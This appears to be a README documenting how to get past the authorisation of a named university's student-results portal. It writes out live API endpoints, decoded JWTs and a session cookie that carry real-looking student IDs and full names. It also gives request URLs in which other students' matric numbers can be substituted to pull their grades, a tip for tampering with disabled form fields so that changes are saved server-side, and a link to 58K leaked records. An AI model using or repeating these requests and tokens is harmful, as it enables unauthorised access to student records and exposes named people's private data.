*******************************************************************************************************************************
# SMP RESULT CHECKER

> Last Update:20/06/2024

*******************************************************************************************************************************

BOMBTIMECS C0. License

Copyright (c) 2024 S.I.F.A.R

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
-------------------------------------------------------------------------------------------------------------------------------

A list of useful payloads and bypasses for Web Application Security.
Feel free to improve with your payloads and techniques !
I :heart: pull requests :)
> [!CAUTION]
Strictly use for internal testing and improving, we did not harm the servers or anything.

-------------------------------------------------------------------------------------------------------------------------------

> [!IMPORTANT]
> ## Referance
>* https://datatracker.ietf.org/doc/html/rfc7515 (JSON Web Signature (JWS))
>* https://datatracker.ietf.org/doc/html/rfc3986 (Uniform Resource Identifier (URI): Generic Syntax)

## Web URL(+request method)
POST https://smp.ums.edu.my/api/result/GetResultV2 HTTP/1.1 --> 200 (for success)

Authorisation(JSON)
-------------------------------------------------------------------------------------------------------------------------------
> [!IMPORTANT]
>## Online Decoder
>* http://calebb.net/ --> JWT Decoder
>* https://www.base64decode.org/ --> BASE64 Decoder

### jwt parse
```
function parseJwt (token) {
    var base64Url = token.split('.')[1];
    var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    var jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));

    return JSON.parse(jsonPayload);
}
```
### antitempered signature(Public Key)
> ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsYVdRaU9pSkNTekU1TVRFd01URTVJaXdpYVhCaFpHUnlJam9pTVRBdU1URTFMamczTGpFd055SXNJbkp2YkdVaU9pSXdNeUlzSW01aVppSTZNVFk0TkRJd09EZzJPU3dpWlhod0lqb3hOamcwTWpFeU5EWTVMQ0pwWVhRaU9qRTJPRFF5TURnNE5qa3NJbWx6Y3lJNkluVnRjeTVsWkhVdWJYa2lMQ0poZFdRaU9pSXFJbjAuNW9WdXUtRGUyOEhHV2E0LXMycTROeTEteU9EdU1FeUFiUTJkaVRfMlc2VQ==

Antitempersignature: 
> ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsYVdRaU9pSkNVREU1TVRFd01EVTJJaXdpYVhCaFpHUnlJam9pTVRBdU1URTFMamt6TGpFMElpd2ljbTlzWlNJNklqQXpJaXdpYm1KbUlqb3hOamcxTlRreE56SXlMQ0psZUhBaU9qRTJPRFUxT1RVek1qSXNJbWxoZENJNk1UWTROVFU1TVRjeU1pd2lhWE56SWpvaWRXMXpMbVZrZFM1dGVTSXNJbUYxWkNJNklpb2lmUS5ZQmlHa3NfdEduRUhSek1OeUNobzRMOUVVRlNVWGhnUTVJeFhXTHZUSmF3

* jwt(token)/header
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
{"typ":"JWT","alg":"HS256"}
```

* claim set/payload
```
eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0 
{"UserID":"BK19110119","UserName":"AMIRA NATASHA SHIRLIN BINTI JAAFRE"}
```

* signature --> need to be same with antitempered signature
> WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc

* format
> [jwt/header].[claim set/payload].[signature]

#### 1
```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
```
The signature is the same and not change every login.

#### 2
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCUDE5MTEwMDU2IiwiVXNlck5hbWUiOiJOVVIgS0hBSVJVTk5JU0FcdTAwMjcgQklOVEkgU0FaQUxJIn0.inQ1VPeCKEog6010ayG94uQ21_dDaAbn-MbdfDKW04o
{typ: "JWT",alg: "HS256"}.{UserID: "BP19110056",UserName: "NUR KHAIRUNNISA\u0027 BINTI SAZALI"}.[signature]
```

#### 3
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCUDE5MTEwMDU2IiwiVXNlck5hbWUiOiJOVVIgS0hBSVJVTk5JU0FcdTAwMjcgQklOVEkgU0FaQUxJIn0.inQ1VPeCKEog6010ayG94uQ21_dDaAbn-MbdfDKW04o
{typ: "JWT",alg: "HS256"}.{UserID: "BP19110056",UserName: "NUR KHAIRUNNISA\u0027 BINTI SAZALI"}.[signature]
```

#### 4
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMDk2IiwiVXNlck5hbWUiOiJOVVIgQU1BTkkgQkFMUUlTIEJJTlRJIEFETkFOIn0.R7oaYF4OazAoI1vYriOrLrGY0t5LBcuWDv9Rr0D-pKE
{typ: "JWT",alg: "HS256"}.{UserID: "BK19110096",UserName: "NUR AMANI BALQIS BINTI ADNAN"}.[signature]

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.e1VzZXJJRDogIkJLMTkxMTAwOTMiLFVzZXJOYW1lOiAiTVVIQU1NQUQgRkFJWiBBSU1BTiBCSU4gQ0hFIFVNQVIifQ.R7oaYF4OazAoI1vYriOrLrGY0t5LBcuWDv9Rr0D-pKE
```
*******************************************************************************************************************************

## Cookie
-------------------------------------------------------------------------------------------------------------------------------
```
dashboard=default; 
SysCulture=en-AU; 
ASP.NET_SessionId=a45zzajkhspz0k5jrc3sqg1o; 
ARRAffinity=5b3f8a12403b9dc2b986729a83bf573dfabff49059ab229ec52134ff3910c818; c_jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
```
*******************************************************************************************************************************

Print(Button JS Request)
-------------------------------------------------------------------------------------------------------------------------------
### Web request
```
https://smp.ums.edu.my/api/result/PrintResultBMVersion?Nomatrik=BK19110096&KodSesiSem=1-2019/2020&KatPel=02&KodProgram=HA20
```
*******************************************************************************************************************************
### Data Acquired (JSON)
-------------------------------------------------------------------------------------------------------------------------------
```
{\"isdebt\":false,
\"getSesiLatest\":\"1-2022/2023\",
\"result_type\":\"pra_normal\",

\"result\":
[{\"SMP07_KodMP\":\"KS30903\",
\"SMP17_Gred\":\"C\",
\"SMP17_MNilaian\":2.0,
\"SMP07_NamaBI\":\"MEASUREMENT AND INSTRUMENTATION\",
\"SMP07_Kredit\":3,
\"SMP01_Nomatrik\":\"BK19110287\",
\"KodSesi_Sem\":\"1-2022/2023\",
\"SMP11_Status\":\"UM1\",
\"Nilai\":\"LULUS\"},

{\"SMP07_KodMP\":\"KS32503\",
\"SMP17_Gred\":\"C+\",
\"SMP17_MNilaian\":2.33,
\"SMP07_NamaBI\":\"EMBEDDED SYSTEMS\",
\"SMP07_Kredit\":3,
\"SMP01_Nomatrik\":\"BK19110287\",
\"KodSesi_Sem\":\"1-2022/2023\"
,\"SMP11_Status\":\"UM1\"
,\"Nilai\":\"LULUS\"}]
```
*******************************************************************************************************************************

### Testing Site
-------------------------------------------------------------------------------------------------------------------------------
> Just Append this code on suitable place in html document file.

For more refrence can check sample of HTML document provide in the files.
### Need To Login First
> Change when needed

## SMP Exam Slip
```
https://smp.ums.edu.my/api/result/PrintResultBMVersion?Nomatrik=BK19110097&KodSesiSem=1-2022/2023&KatPel=02&KodProgram=HK20
```
If error like this occur:
```
{"Message":"[ERR5]: You are not authorized to access the page.Your Session Is expired.Please re-login for further action"}
Please relogin into smp back again/Cookies expired

<a id="ctl00_cph_SecuredPage_ctrl_SlipPeperiksaanPelajar_btnCetak" class="btn btn-primary" usesubmitbehavior="false" href="javascript:__doPostBack('ctl00$cph_SecuredPage$ctrl_SlipPeperiksaanPelajar$btnCetak','')">Cetak</a>

```

# In testing
```
src="https://smp.ums.edu.my/Submodules/RekodPeribadi/PeribadiPelajar.aspx?auth_sub=814f06ab7f40b2cff77f2c7bdffd3415&auth_usr=1f77efd42d9a3b009f4bb64bf5842b16&auth_mdl=96a3be3cf272e017046d1b2674a52bd3"

<select name="ctl00$cph_SecuredPage$ctrl_EditPeribadiascx1$SMP01_Fakulti" onchange="javascript:setTimeout('__doPostBack(\'ctl00$cph_SecuredPage$ctrl_EditPeribadiascx1$SMP01_Fakulti\',\'\')', 0)" id="ctl00_cph_SecuredPage_ctrl_EditPeribadiascx1_SMP01_Fakulti" disabled="disabled" class="aspNetDisabled span12">
	<option value="ASTiF">ACADEMY OF ARTS AND CREATIVE TECHNOLOGY</option>
	<option value="FIS">FACULTY OF ISLAMIC STUDIES</option>
	<option value="FKAL">LABUAN FACULTY OF INTERNATIONAL FINANCE</option>
	<option value="FKI">FACULTY OF COMPUTING AND INFORMATICS</option>
	<option selected="selected" value="FKJ">FACULTY OF ENGINEERING</option>
	<option value="FKSW">FACULTY OF HUMANITIES, ARTS AND HERITAGE</option>
	<option value="FPEP">FACULTY OF BUSINESS, ECONOMICS AND ACCOUNTANCY</option>
	<option value="FPL">FACULTY OF SUSTAINABLE AGRICULTURE</option>
	<option value="FPP">FACULTY OF PSYCHOLOGY AND EDUCATION</option>
	<option value="FPSK">FACULTY OF MEDICINE AND HEALTH SCIENCES</option>
	<option value="FPT">FACULTY OF TROPICAL FORESTRY</option>
	<option value="FSMP">FACULTY OF FOOD SCIENCE AND NUTRITION</option>
	<option value="FSSA">FACULTY OF SCIENCE AND NATURAL RESOURCES</option>
	<option value="FSSK">FACULTY OF SOCIAL SCIENCES AND HUMANITIES</option>
	<option value="IBTP">INSTITUTE FOR TROPICAL BIOLOGY AND CONSERVATION </option>
	<option value="IPB">BIOTECHNOLOGY RESEARCH INSTITUTE</option>
	<option value="IPMB">BORNEO MARINE RESEARCH INSTITUTE</option>
	<option value="PKPP">CENTRE FOR CO-CURRICULUM AND STUDENT DEVELOPMENT</option>
	<option value="PPIB">CENTER FOR PROMOTION OF KNOWLEDGE AND LANGUAGE</option>
	<option value="PPPG">Centre of Internationalisation and Global Engagement</option>
	<option value="PPST">PREPARATORY CENTRE FOR SCIENCE AND TECHNOLOGY</option>
	<option value="SKTM">SCHOOL OF ENGINEERING AND INFORMATION TECHNOLOGY</option>
	<option value="SPE">SCHOOL OF BUSINESS AND ECONOMICS</option>
	<option value="SPKA">LABUAN SCHOOL OF INTERNATIONAL BUSINESS AND FINANCE</option>
	<option value="SPKS">SCHOOL OF PSYCHOLOGY AND SOCIAL WORK</option>
	<option value="SPL">SCHOOL OF SUSTAINABLE AGRICULTURE</option>
	<option value="SPPS">SCHOOL OF EDUCATION AND SOCIAL DEVELOPMENT</option>
	<option value="SPS">SCHOOL OF ARTS</option>
	<option value="SPTA">SCHOOL OF INTERNATIONAL TROPICAL FORESTRY</option>
	<option value="SPU">SCHOOL OF MEDICAL</option>
	<option value="SSIL">LABUAN SCHOOL OF INFORMATIC SCIENCE</option>
	<option value="SSMP">SCHOOL OF FOOD SCIENCE AND NUTRITION</option>
	<option value="SSS">SCHOOL OF SOCIAL SCIENCE</option>
	<option value="SST">SCHOOL OF SCIENCE AND TECHNOLOGY</option>

</select>
```
> [!WARNING]
>## There some site that works by disable few parameter
> https://smp.ums.edu.my/Home.aspx#peribadipelajar
> 
> This can be done by change parameter on the html code and recorded in server side
# Not Working
```
<input type="button" name="btnPrint" value="Print Result (BM)" class="btn btn-primary" style="">

<input type="button" name="btnPrint" value="Print Result (EN)" class="btn btn-primary" style="">
```
> [!NOTE]
> Ensure that student and staff change the password regularly to avoid any misuse occur
> 
> Currently there is more [58K](https://github.com/AgentHitmanFaris/HK-20/blob/main/SMP_BackDoor/encrypted_data.txt) data been leake due to misuse/misleading port
